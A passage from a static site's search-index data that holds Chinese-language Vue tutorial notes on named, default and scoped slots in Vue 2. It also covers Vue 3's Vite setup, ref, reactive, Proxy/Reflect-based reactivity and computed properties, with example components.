</category>\n  </div>\n</template>\n\n<script>\nimport category from "./components/category.vue";\nexport default {\n  name: "app4",\n  components: { category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n      games: ["王者荣耀", "英雄联盟", "绝地求生"],\n      movies: ["头文字d", "不能说的秘密", "我不是药神"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer,\n.foot {\n  display: flex;\n  justify-content: space-around;\n}\nimg,\nvideo {\n  width: 100%;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\ncategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 多个插槽使用name进行区分，这叫做具名插槽 --\x3e\n    <slot name="default">我是content插槽的后备内容</slot>\n    <slot name="content">我是content插槽的后备内容</slot>\n    <slot name="footer">我是footer插槽的后备内容</slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "category",\n  props: ["title", "listdata"],\n};\n<\/script>\n\n<style>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n父组件可以使用多个同插槽名的自定义内容，最终会将这些同名的自定义内容放到了同一个插槽里面（比如上例里的第三个category组件）。如果想把多个自定义内容放一起但又不想多包一层div，可以使用<template #xxx>模板进行包裹（（比如上例里的第二个category组件））。\n\n\n# 7.3 作用域插槽\n\n我们可以继续观察默认插槽里的例子，那个listdata数据是在父组件里的，如果实际开发中数据就存在于子组件里，并且因为历史原因还不容易移到父组件上去的话，这该如何进行优化修改呢？\n\n插槽还有一种作用于插槽，可以从子组件插槽这里将数据传递给父组件的自定义内容处，这个就比较奇特了。父组件将“结构”传给子组件之前反而子组件将你需要的数据反传过来了。这种方式称为插槽prop，这和父子props方式类似，但插槽prop最后并没有将数据添加到父组件实例上，它的作用域仅限于那个自定义内容那块范围（name那块的<template>内部），这点得与props区分开。\n\n作用域插槽的具体使用：\n\n 1. 在<slot>标签里使用类似props的传参方式，也就是使用属性（静态传递或动态绑定后传递都可）。\n 2. 父组件里自定义内容处（）：\n    1. 无论是默认插槽还是具名插槽，只要自定义内容是<template>包裹或者是自定义组件，那就可以在<template>标签或者自定义组件调用标签里，加上#xxx="yyy"，xxx是插槽名（name值），yyy是传参对象（通过插槽prop传来的所有参数集中在该对象上）。\n    2. 如果只是默认插槽，自定义内容也没有用<template>包裹也不是自定义组件，那么可以将#default="yyy"直接加到子组件调用标签里，yyy是传参对象。\n    3. 没有普通元素的场景，无法将#xxx="yyy"加到普通元素上，这是作用域插槽这不是具名插槽（加作用域和加名字不一样）。这是因为作用域插槽除了刚刚第二种场景以外，就只能用在<template>这种场景下了。\n    4. 我们并没有介绍name="xxx" scope="yyy"的写法，这是2.6版本以前的写法，除非遇到老项目要维护，不推荐使用老写法了。这种老写法也不能加到普通元素上了，老老实实使用<template>方式吧！！！\n 3. 子组件插槽传参的话，比如这边是<slot :foods="foods" name="xxx">，那边得是<template #xxx="yyy">。注意，yyy并不就是foods了，这个foods传过来后它只是yyy上的一个属性，也就是说使用yyy.foods才能取到想要值。这个yyy传参对象，是包含了所有的插槽传参属性，所以你还能使用对象的解构。\n\n将第一节的例子进行修改，把listdata数据放到category组件内，使用插槽prop将数据传给自定义内容，自定义内容使用#xxx="yyy"进行接收。\n\napp4.vue：\n\n<template>\n  <div class="outer">\n    <category title="美食">\n      \x3c!-- 一般场景，而且一般都是具名插槽。在template标签里加上了`#default="param"` --\x3e\n      <template #default="param">\n        <ul>\n          \x3c!-- foods只是param对象里的一个属性 --\x3e\n          <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n        </ul>\n      </template>\n    </category>\n    \x3c!-- 该场景仅限于默认插槽。在子组件category标签里加上了`#default="param"`，这是个特例，域插槽几乎只用在template上 --\x3e\n    <category title="美食" #default="param">\n      \x3c!-- 千万不在ol标签里加上`#default="param"`，一是因为v-slot之能用在template上，二是因为就算你使\n      用老写法`slot="default" scope="param"`也不行，因为作用域插槽几乎只用在template上，不会用在普通元素上 --\x3e\n      <ol>\n        \x3c!-- foods只是param对象里的一个属性 --\x3e\n        <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n      </ol>\n    </category>\n    <category title="美食">\n      \x3c!-- 一般场景，而且一般都是具名插槽。在template标签里加上了`#default="param"` --\x3e\n      <template #default="param">\n        <div>\n          \x3c!-- foods只是param对象里的一个属性 --\x3e\n          <h4 v-for="(item, index) in param.foods" :key="index">{{ item }}</h4>\n        </div>\n      </template>\n    </category>\n  </div>\n</template>\n\n<script>\nimport category from "./components/category.vue";\nexport default {\n  name: "app4",\n  components: { category },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\ncategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 这是默认的作用域插槽，将数据传给了各个自定义内容处 --\x3e\n    <slot :foods="foods"></slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "category",\n  props: ["title"],\n  // 对比默认插槽，数据从父组件移到了子组件内部\n  // 如果外界想用，就通过类似props方式传出去\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插槽的作用：让父组件可以向子组件指定位置插入自定义内容（将自定义结构传到子组件内部），也是一种组件间通信的方式，适用于父===>子。\n\n 2. 插槽分类：默认插槽、具名插槽、作用于插槽。\n\n 3. 默认插槽的使用：\n    \n    \x3c!-- 父组件，将自定义内容传递给子组件，也就是插入到子组件插槽处 --\x3e\n    <category>\n      <div>这个div就是一个自定义内容（自定义结构）</div>\n    </category>\n    \x3c!-- 子组件，使用插槽<slot>来承接自定义内容 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        \x3c!-- 默认插槽没有名字，其实有name="default"的默认名字 --\x3e\n        <slot>这是一个默认插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. 具名插槽的使用：\n    \n    \x3c!-- 父组件里的自定义内容，使用slot="xxx"区分 --\x3e\n    <category>\n      \x3c!-- 普通元素的场景，使用slot="center" --\x3e\n      <div slot="center">这个div就是一个自定义内容（自定义结构）</div>\n      \x3c!-- 用<template>进行了包裹的场景，那就在template标签里使用#footer（全写是v-slot:footer） --\x3e\n      <template #footer>\n        <div>这个div就是一个自定义内容（自定义结构）</div>\n      </template>\n    </category>\n    \x3c!-- 子组件，使用name="xxx"，主要是为了分区 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        \x3c!-- 具名插槽，名字是"center" --\x3e\n        <slot name="center">这是一个具名插槽</slot>\n        \x3c!-- 具名插槽，名字是"footer" --\x3e\n        <slot name="footer">这是一个具名插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 5. 作用域插槽的使用（关键数据在子组件中）：\n    \n    \x3c!-- 父组件里的自定义内容，如果在具名插槽下就必须使用template进行包裹 --\x3e\n    <category>\n      <template #footer="param">\n        <ul>\n          \x3c!-- param是参数对象，foods只是它其中的一个属性 --\x3e\n          <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n        </ul>\n      </template> \n    </category>\n    \x3c!-- 父组件里的自定义内容，如果是默认插槽可以将#default="param"写到子组件标签里 --\x3e\n    <category #default="param">\n      \x3c!-- 可以改成上面那种，使用默认插槽式的作用域插槽很容易让人犯糊涂 --\x3e\n      <ol>\n        \x3c!-- param是参数对象，games只是它其中的一个属性 --\x3e\n        <li v-for="(item, index) in param.games" :key="index">{{ item }}</li>\n      </ol>\n    </category>\n    \x3c!-- 子组件，使用了插槽porps对父组件的自定义内容进行了传参 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        <slot :games="games">这是一个作用域插槽插槽</slot>\n        <slot name="footer" :foods="foods">这是一个作用域插槽插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n\n----------------------------------------',charsets:{cjk:!0}},{title:"4.vue3学习",frontmatter:{title:"4.vue3学习"},regularPath:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/4.vue3%E5%AD%A6%E4%B9%A0.html",relativePath:"book-web/web前端js框架/学习Vue/4.vue3学习.md",key:"v-39b874c9",path:"/book-web/web%E5%89%8D%E7%AB%AFjs%E6%A1%86%E6%9E%B6/%E5%AD%A6%E4%B9%A0Vue/4.vue3%E5%AD%A6%E4%B9%A0.html",headers:[{level:2,title:"用Vite初始化项目",slug:"用vite初始化项目",normalizedTitle:"用vite初始化项目",charIndex:11},{level:2,title:"常用的Composition API",slug:"常用的composition-api",normalizedTitle:"常用的composition api",charIndex:944},{level:3,title:"setup()和script setup",slug:"setup-和script-setup",normalizedTitle:"setup()和script setup",charIndex:967},{level:3,title:"ref()",slug:"ref",normalizedTitle:"ref()",charIndex:2676},{level:3,title:"reactive()",slug:"reactive",normalizedTitle:"reactive()",charIndex:3609},{level:3,title:"简单说说Vue3的响应式",slug:"简单说说vue3的响应式",normalizedTitle:"简单说说vue3的响应式",charIndex:4930},{level:3,title:"computed()",slug:"computed",normalizedTitle:"computed()",charIndex:11449},{level:3,title:"watch()的十一种情况",slug:"watch-的十一种情况",normalizedTitle:"watch()的十一种情况",charIndex:12708},{level:3,title:"watchEffect()",slug:"watcheffect",normalizedTitle:"watcheffect()",charIndex:21649},{level:3,title:"Vue3的生命周期钩子",slug:"vue3的生命周期钩子",normalizedTitle:"vue3的生命周期钩子",charIndex:24554},{level:3,title:"toRef()和toRefs()",slug:"toref-和torefs",normalizedTitle:"toref()和torefs()",charIndex:25122},{level:3,title:"自定义hook",slug:"自定义hook",normalizedTitle:"自定义hook",charIndex:25685},{level:2,title:"其他Composition API",slug:"其他composition-api",normalizedTitle:"其他composition api",charIndex:26752},{level:3,title:"shallowReactive()和shallowRef()",slug:"shallowreactive-和shallowref",normalizedTitle:"shallowreactive()和shallowref()",charIndex:26774},{level:3,title:"readonly()和shallowReadonly()",slug:"readonly-和shallowreadonly",normalizedTitle:"readonly()和shallowreadonly()",charIndex:28594},{level:3,title:"toRaw()和markRaw()",slug:"toraw-和markraw",normalizedTitle:"toraw()和markraw()",charIndex:29053},{level:3,title:"customRef()",slug:"customref",normalizedTitle:"customref()",charIndex:29633},{level:3,title:"triggerRef()",slug:"triggerref",normalizedTitle:"triggerref()",charIndex:30788},{level:3,title:"provide()和inject()",slug:"provide-和inject",normalizedTitle:"provide()和inject()",charIndex:31162},{level:3,title:"isRef、isReactive、isReadonly、isProxy、unref",slug:"isref、isreactive、isreadonly、isproxy、unref",normalizedTitle:"isref、isreactive、isreadonly、isproxy、unref",charIndex:32606}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"用Vite初始化项目 常用的Composition API setup()和script setup ref() reactive() 简单说说Vue3的响应式 computed() watch()的十一种情况 watchEffect() Vue3的生命周期钩子 toRef()和toRefs() 自定义hook 其他Composition API shallowReactive()和shallowRef() readonly()和shallowReadonly() toRaw()和markRaw() customRef() triggerRef() provide()和inject() isRef、isReactive、isReadonly、isProxy、unref",content:"# Vue3\n\n\n# 用Vite初始化项目\n\n先创建项目\n\n// 全局安装yarn（有就跳过，或者你想用npm）\nnpm install --global yarn\n// 使用yarn和vite创建项目my-vue-app\nyarn create vite my-vue-app --template vue\n// npm方式\nnpm init vite@latest my-vue-app -- --template vue\n\n\n1\n2\n3\n4\n5\n6\n\n\n然后使用npm install或者yarn下载项目的依赖包，最后可以看一下package.json里的scripts，运行npm run dev启动项目。\n\n{\n  \"scripts\": {\n    \"dev\": \"vite\", // 启动开发服务器，别名：`vite dev`，`vite serve`\n    \"build\": \"vite build\", // 为生产环境构建产物\n    \"preview\": \"vite preview\" // 本地预览生产构建产物\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n到谷歌网上应用商店安装Vue.js devtools，图标里带个“beta”的是Vue3的开发者工具。右击“管理扩展程序”，选择“允许访问文件网址”。\n\n走读一些文件：\n\n * index.html放在了根目录了，这个是由Vite决定的，本地开发时index.html作为入口，根据它里面的<script type=\"module\" src=\"...\">来动态解析模块。他是先启动服务后动态解析模块，而webpack是先解析模块后启动服务。\n * main.js里最大改变是createApp，而Vue2是new Vue()（而且Vue已经引不进来了，只能使用createApp）。这个createApp是个工厂函数，用于创建应用实例。它的入参和new Vue()的入参一样是组件选项对象，但是它创建出来的实例很“轻”，你可以console.log打印一下实例。\n * App.vue，这<template>里不再约束只能有一个根节点，现在可以看到它有同级的<img>和<HelloWorld>。\n\n\n# 常用的Composition API\n\n\n# setup()和script setup\n\nComposition API意思是组合式API，以前Vue2是Options API配置化API，在Vue3初期版本还是存在配置项+Composition API写法的，这是为了让开发者能平稳过渡。\n\nsetup是一个函数，在组件选项对象属于一个新的配置项，与name等配置是同级的。它用于承载其他的Composition API，组件中所用到的数据、方法、计算属性、监视属性、生命周期等都可以配置在setup里面。\n\n\x3c!-- MyBook.vue --\x3e\n<template>\n  <div>{{ msg }}: {{ readersNumber }} || {{ book.title }}</div>\n  <button type=\"button\" @click=\"hello\">点我</button>\n</template>\n\n<script>\n  import { ref, reactive } from 'vue'\n  export default {\n    props: {\n      msg: String\n    },\n    setup(props) {\n      // data里的一些响应式数据\n      const readersNumber = ref(0)\n      const book = reactive({ title: 'Vue 3 Guide' })\n      // methods里的方法\n      function hello() { alert('hello'); }\n      // 给<template>用的数据，必须return出去\n      return { readersNumber, book, hello }\n    }\n  }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n不过，我本人并不推荐这种半Options API半Composition API的写法。这些个data、methods要放在setup函数内部，最后还有个return返回一大串数据供template使用（代码过长你可能忘记return了）。它同级还有components、props等，如果你初次接触就会有些迷惑，到底哪些是配置式写法哪些要放到setup里组合起来写（可以两种方法混用，但setup里的更优先），这到底是在写Vue2还是在写Vue3呢？\n\n我推荐<script setup>的写法（setup作为<script>一个属性），它是在Vue3.2时推出的，它的样板代码会少很多，没有了return等（这个return有点像React返回jsx）。但是它需要你额外使用defineProps、computed、useContext等钩子。如果你学习过React，就会发现它和函数式组件+hooks的方案非常像。\n\n<template>\n  <div>{{ msg }}: {{ readersNumber }} || {{ book.title }}</div>\n  <button type=\"button\" @click=\"hello\">点我</button>\n</template>\n\n<script setup>\nimport { ref, reactive } from 'vue'\n\n// 父组件传来的props数据\ndefineProps({ msg: String })\n// data里的一些响应式数据\nconst readersNumber = ref(0)\nconst book = reactive({ title: 'Vue 3 Guide' })\n// methods里的方法\nconst hello = () => { alert('hello'); }\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# ref()\n\n上面例子中的readersNumber它是一个响应式数据。它使用了ref()这个新函数（这可不是节点中的ref属性），该函数返回的是一个对象（响应式引用）。这个对象有个value属性，是响应式数据的值，可以在js代码中拿到这个value进行修改，就能通知用到该数据的模板去diff。\n\n例如readersNumber.value = 1，这个有点像React中的setState()了。如果是在模板中就直接用该数据，不用.value。\n\n<template>\n  \x3c!-- 不用.value，直接用 --\x3e\n  <div>姓名：{{name}}</div>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst name = ref('张三')\n// 需要.value\nconst handleClick = () => name.value = '李四'\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n如果这响应式数据是个对象呢，在js中用的时候对象是有value的，它的属性就不需要使用value了\n\n<template>\n  <div>姓名：{{obj.name}}</div>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { ref } from 'vue'\n\nconst obj = ref({\n  name: '张三',\n  age: 18\n})\nconst handleClick = () => obj.value.name = '李四'\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果你在控制台打印name和obj会发现，它们的value有些不一样，obj的value是个Proxy类型的对象，其实是通过Vue3提供的reactive()处理成Proxy对象的。\n\n\n\n\n# reactive()\n\nreactive()新函数一般用于声明一个对象类型（准确说是复杂类型）的响应式数据，而ref()大多声明一个基本类型的响应式数据。\n\nreactive()新函数返回的是一个Proxy类型的对象，它如果在js中修改值就不需要value，因为它其实是个代理对象，通过代理对象.属性名就能拿到对应的属性值，具体下一节会讲Proxy代理，我们看一下reactive()使用的例子。\n\n<template>\n  \x3c!-- 不用.value，直接用 --\x3e\n  <div>姓名：{{obj.name}}</div>\n  <div>{{obj.a.b}} || {{obj.a.c.d}}</div>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { reactive } from 'vue'\n\nconst obj = reactive({\n  name: '张三',\n  a: {\n      b: 1,\n      c: {\n          d: 2\n      }\n  }\n})\n// 不用.value了，直接取这个属性\nconst handleClick = () => {\n    obj.name = '李四'\n    obj.a.b = 3       // 深层次的也能被监测到\n    obj.a.c.d = 4     // 深层次的也能被监测到\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n我们再看一下reactive()里使用数组，返回的这个对象可以用索引修改某项，不再局限于“Vue2中数组类型响应式数据只能使用8个方法来维持响应式”，也不用额外使用this.$set或者Vue.set了。\n\n<template>\n  <ul>\n    <li v-for=\"item in arr\" :key=\"item.id\">名字：{{item.name}}</li>\n  </ul>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { reactive } from 'vue'\n\nconst arr = reactive([{id:'1',name:'张三'},{id:'2',name:'李四'},{id:'3',name:'王五'}])\n// 可以直接通过索引修改数组某项了，不用再通过this.$set了\nconst handleClick = () => {\n    arr[0] = {id:'4',name:'赵六'}\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 简单说说Vue3的响应式\n\n我们回顾一下Vue2的响应式，可以在Vue.js搜一下proxy或者initData，可以看到如下代码，源对象是this._data.xxx和this._props.yyy，而使用的代理对象是this.xxx和this.yyy，也就可以在methods等地方使用代理对象this.xxx和this.yyy，模板中使用就去掉了this。而真正的响应式处理是下面第二段代码，用了一个observer观察者，在设置数据时会通知（dep.notify()）模板去diff。\n\n/**\n * target是this也就是vm，sourceKey这里是_data（或者_props），key是xxx某个属性\n * 意思是让this.xxx作为this._data.xxx的代理对象。读取this.xxx的属性其实就是\n * 读取this._data.xxx的属性，设置this.xxx的属性其实就是设置this._data.xxx的属性\n*/\nfunction proxy(target, sourceKey, key) {\n    // getter\n    sharedPropertyDefinition.get = function proxyGetter() {\n        return this[sourceKey][key]\n    };\n    // setter\n    sharedPropertyDefinition.set = function proxySetter(val) {\n        this[sourceKey][key] = val;\n    };\n    // 添加key，并设置特性\n    Object.defineProperty(target, key, sharedPropertyDefinition);\n}\n// 上面这段代码是1.vue基础的“二、Vue的MVVM和数据代理”内容，下面这段代码是1.vue基础的“七、Vue的数据监视”内容\n\n/**\n *  obj是this._data，key就是this._data.xxx，重点就是setter里的dep.notify()\n *  当开发人员修改this.xxx是也会让this._data.xxx修改（上面的代码试想的），又由于下面的\n *  代码，在this._data.xxx修改时会dep.notify()通知模板去diff根据结果来是否重新渲染页面\n*/\nfunction defineReactive$$1(obj, key, val, customSetter, shallow) {\n    // 读取obj对象里key属性的特性\n    var property = Object.getOwnPropertyDescriptor(obj, key);\n    if (property && property.configurable === false) return\n    var getter = property && property.get;\n    var setter = property && property.set;\n    // val是重点，下面的getter和setter最后都是访问的val，它是中间量\n    if ((!getter || setter) && arguments.length === 2) {\n        val = obj[key];\n    }\n    // 多层级的对象暂时不考虑，这个会用到递归\n    // var childOb = !shallow && observe(val);\n    // 修改obj对象里key属性的特性\n    Object.defineProperty(obj, key, {\n        enumerable: true,\n        configurable: true,\n        get: function reactiveGetter() {\n            return getter ? getter.call(obj) : val;\n        },\n        set: function reactiveSetter(newVal) {\n            setter ? setter.call(obj, newVal) : (val = newVal);\n            // 触发更新\n            dep.notify();\n        }\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n看上面的代码你还可以明确一点，一切都是围绕着对象的属性来做文章的（而且只能get和set，删除属性和追加属性就不行了），这也是数组类型的响应式对象使用索引去修改为什么不行，并且Vue2还重写了数组的那8个方法来实现响应式。\n\n简单复习一下Proxy和Reflect。const proxy = new Proxy(target, handler)，target是源对象，proxy是代理对象，handler是处理器对象。如果这个处理器对象是个{}空字面量对象的话，那就和上面function proxy(target, sourceKey, key)自定义函数一样，只是单纯的“数据转发”。这个es6提供的Proxy的优势在于，它是es6原生提供的函数，功能强大稳定（意思是不止能监视get和set，还有delete等等方法），然后target可以是任何类型的对象（包括原生数组、函数，甚至另一个代理），Object.defineProperty其实只针对于对象的属性对于数组就爱莫能助了。\n\nconst arr = [{id:'1',name:'张三'},{id:'2',name:'李四'},{id:'3',name:'王五'}];\nconst proxy = new Proxy(arr, {\n  set(target, prop, val) {\n    target[prop] = val\n    console.log('通知模板去diff')\n    return true\n  }\n});\nproxy[0] = {id:'4',name:'赵六'}\nconsole.log('arr', arr);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n那么Reflect又是什么呢？它是一个反射，可以很方便对对象进行“增删改查”，其中对象本身的“查”和“改”很容易，而“增”和“删”就不是那么方便了，例如删除一个属性要使用delete obj.xxx，追加一个属性要Object.defineProperty(obj, 'xxx', { ... })。而Reflect比较统一：\n\nconst obj = { name: '张三' };\nconsole.log('读取name属性值: ', Reflect.get(obj, 'name'));\nReflect.set(obj, 'name', '李四')\nconsole.log('修改name属性值: ', obj.name);\nconsole.log('删除name属性是否成功: ', Reflect.deleteProperty(obj, 'name'));\nconsole.log('name属性值: ', obj.name);\nconsole.log('新增age属性是否成功: ', Reflect.defineProperty(obj, 'age', {\n    get: () => 18\n}));\nconsole.log('age属性值: ', obj.age);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nReflect的第一个好处是多次Reflect.defineProperty不会报错并且返回结果，而Object.defineProperty(obj, 'xxx', { ... })多次就会报错得使用try catch进行异常捕获。Reflect的第二个好处是，能用receiver处理this。\n\nlet user = {\n  _name: \"Guest\",\n  get name() {\n    return this._name;\n  }\n};\n\nlet userProxy = new Proxy(user, {\n  get(target, prop, receiver) {\n    // return Reflect.get(target, prop, receiver)\n    return target[prop]; // (*) target = user\n  }\n});\n\nlet admin = {\n  __proto__: userProxy,\n  _name: \"Admin\"\n};\n\n// 期望输出：Admin\nconsole.log(admin.name); // 输出：Guest (?!?)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n上面这个代码，admin.name通过原型找到userProxy，通过代理找到user上的get name，而这个get name里的this自然就是上下文对象user，那么就会输出user._name的值Guest。如果要Reflect进行代码修改*号那行就改为return Reflect.get(target, prop, receiver)，这个receiver就会让实际的get name方法的this指向代理对象userProxy所在的上下文对象也就是admin，那么最后就会输出Admin。\n\nVue3的相关源码可以搜function reactive\n\n// 我们只看get/set\nconst set = /*#__PURE__*/ createSetter();\nconst get = /*#__PURE__*/ createGetter();\nconst mutableHandlers = {\n    get,\n    set,\n    /* 省略... */\n};\n// 响应式数据\nfunction reactive(target) {\n    if (target && target[\"__v_isReadonly\" /* IS_READONLY */]) {\n        return target;\n    }\n    return createReactiveObject(target, false, mutableHandlers, mutableCollectionHandlers, reactiveMap);\n}\n// 生成响应式数据，看baseHandlers也就是上面的mutableHandlers\nfunction createReactiveObject(target, isReadonly, baseHandlers, collectionHandlers, proxyMap) {\n    /* 省略... */\n    // 我们看targetType为1（Object和Array的场景），也就是baseHandlers\n    const proxy = new Proxy(target, targetType === 2 /* COLLECTION */ ? collectionHandlers : baseHandlers);\n    proxyMap.set(target, proxy);\n    return proxy;\n}\n// 修改响应式数据时\nfunction createSetter(shallow = false) {\n    return function set(target, key, value, receiver) {\n        /* 省略... */\n        const result = Reflect.set(target, key, value, receiver);\n        // 触发effect（通知模板等）\n        trigger(target, \"set\" /* SET */, key, value, oldValue);\n        return result;\n    };\n}\n// 读取响应式数据时\nfunction createGetter(isReadonly = false, shallow = false) {\n      return function get(target, key, receiver) {\n          /* 省略... */\n          const res = Reflect.get(target, key, receiver);\n          if (!isReadonly) {\n              // 添加effect\n              track(target, \"get\" /* GET */, key);\n          }\n          if (isRef(res)) {\n              const shouldUnwrap = !targetIsArray || !isIntegerKey(key);\n              return shouldUnwrap ? res.value : res;\n          }\n          if (isObject(res)) {\n              return isReadonly ? readonly(res) : reactive(res);\n          }\n          return res;\n      };\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\nProxy不支持对基本类型数据进行代理，所以基本类型数据还是简单的getter和setter，也就能解释之前的说的ref里传入对象，它的value是个Proxy类型，而基本类型的不是Proxy类型了。\n\n最后解释一下：\n\n * trigger是触发effect，track是添加effect，这个effect的意思是副作用，这里是用于通知模板重新渲染等一些功能。\n * 至于副作用，是“函数外部环境发生的交互”，例如网络请求、DOM操作、订阅数据来源、写入文件系统、获取用户输入等。\n * 提到副作用就不得不提到纯函数，它有两个特点：\n   * 1)该函数不会对入参本身进行修改，必须得有return返回值；在相同的入参时，需产生相同的返回值。\n   * 2)该函数得没有副作用；返回值可以与入参无关（有关也可以），但是不能与入参以外的变量或者其他影响有关。\n\n\n# computed()\n\n计算属性用了computed()这个新函数，如果只有getter那就传递一个函数，使用这个计算属性时也需要.value（模板中不需要）。它是惰性的，意思是只在数据源发生改变时才执行里面的函数（多次访问计算属性，只要数据源没变就直接返回之前计算的值）。\n\n<template>\n  <div>counter: {{counter}}</div>\n  <div>newCounter: {{newCounter}}</div>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { ref, computed } from 'vue'\n\nconst counter = ref(0)\n// 传递一个函数（getter）\nconst newCounter = computed(() => counter.value * 2);\nconst handleClick = () => {\n  counter.value++;\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果还有setter那么就得传递一个对象，具体看下面这个例子\n\n<template>\n  <div>姓: {{lastName}}</div>\n  <div>名: {{firstName}}</div>\n  <div>全名: {{fullName}}</div>\n  <button type=\"button\" @click=\"handleClick\">点我</button>\n</template>\n\n<script setup>\nimport { ref, computed } from 'vue'\n\nconst firstName = ref('三')\nconst lastName = ref('张')\n// 传递一个对象（要包含getter和setter）\nconst fullName = computed({\n  get: () => lastName.value +'|' + firstName.value,\n  set: (value) => {\n    const arr = value.split('|');\n    if (arr.length === 2) {\n      lastName.value = arr[0]\n      firstName.value = arr[1]\n    }\n  }\n})\nconst handleClick = () => {\n  fullName.value = '李|四';\n}\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# 